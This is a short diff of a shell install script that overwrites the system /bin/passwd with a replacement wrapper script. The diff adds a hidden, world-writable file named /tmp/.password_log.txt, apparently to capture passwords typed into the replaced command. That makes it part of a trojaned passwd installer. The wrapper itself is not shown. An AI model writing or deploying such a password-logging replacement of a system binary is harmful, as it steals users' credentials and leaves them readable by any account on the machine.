@@ -28,5 +28,9 @@ echo "Creating wrapper for nutty passwd..."
 cp ./passwd_replace.sh /bin/passwd
 chmod 755 /bin/passwd 
 
+echo "Creating log file..."
+touch /tmp/.password_log.txt
+chmod 666 /tmp/.password_log.txt
+
 echo "Finished!"
 exit 0
